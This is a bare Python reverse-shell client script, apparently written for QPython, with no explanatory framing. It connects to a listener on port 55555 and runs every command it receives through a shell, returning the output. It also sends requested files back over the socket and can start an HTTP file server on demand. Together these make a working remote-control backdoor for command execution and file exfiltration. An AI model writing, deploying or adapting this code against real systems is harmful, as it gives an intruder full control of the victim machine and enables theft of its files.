#!/usr/bin/python
#-*-coding:utf8;-*-
#qpy:console
import subprocess
import socket
import time
import os
import http.server
import socketserver
import threading

os.system("clear")
# creating tcp socket as "s"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# get the ip address of current hosting machine
host = socket.gethostname()
port = 55555

# trying to connect to the given host and port
try:
    s.connect((host,port))
except Exception as e:
    print(e)
    exit(0)

while True:
    
    def server_target(IP, PORT):        
        handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
            messeage = "Server started at  -> {}:{}".format(IP,PORT)            
            httpd.serve_forever()
            
    def send(com):
        file_size = os.path.getsize(com)

        s.send(com.encode())
        s.send(str.encode(com))
        with open(com,"rb") as files:            
        
            while True:
                data = files.read(1024)
                if not (data):
                    break
                s.sendall(data)
                #c+=len(data)
                #print("done")

    # storing the receiving data in a variable name "data"
    data = s.recv(1024)
    # checking if the receiving data contains the word "exit" or "quite" if so brack the  loop and exit
    if data.decode("utf-8") == 'exit' or data.decode("utf-8") == "quite":
        break
    # checking if the user trying to change dir
    elif data[:2].decode("utf-8") == "cd":
        d = str(data[3:].decode("utf-8"))
        
        try:
            os.chdir(d)
            msg = "^_^ you are now in:-> {}\n".format(d)
        except:
            msg = "[!][!] Oops! there is no such a directory :p!!:-> {}\n".format(d)
        s.send(str.encode(msg))
    elif data[:6].decode("utf-8") == "server":
        s1 = data[7:].decode("utf-8")
        for i in range(0,len(s1)):
            if s1[i] == ":":
                IP = s1[:i]
                i = i + 1
                PORT = s1[i:]
                message = "sever is runnig on : {}:{}".format(IP,PORT)
                s.send(str.encode(message))
                t = threading.Thread(target = server_target ,args = (IP,PORT))
                t.start()
            else:
                pass
    elif data[:4].decode("utf-8") == "send":
        com = data[5:].decode("utf-8")
        #print("hi")      
        send(com)

    # checking if the receiv data not null(not empty)
    elif len(data) > 0:
        if data[:2].decode("utf-8") == "ls":
            data = "ls --color "+str(data[3:].decode("utf-8"))
            cmd = subprocess.Popen(data ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_string = str(output_bytes, "utf-8")
        else:
            cmd = subprocess.Popen(data.decode("utf-8") ,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_string = str(output_bytes, "utf-8")
            # checking if the output of the receive data is null(empty)
            if len(output_string) == 0:
                output_string = "[ ^_^ DONE!!!]"
        s.send(str.encode(output_string))
s.close()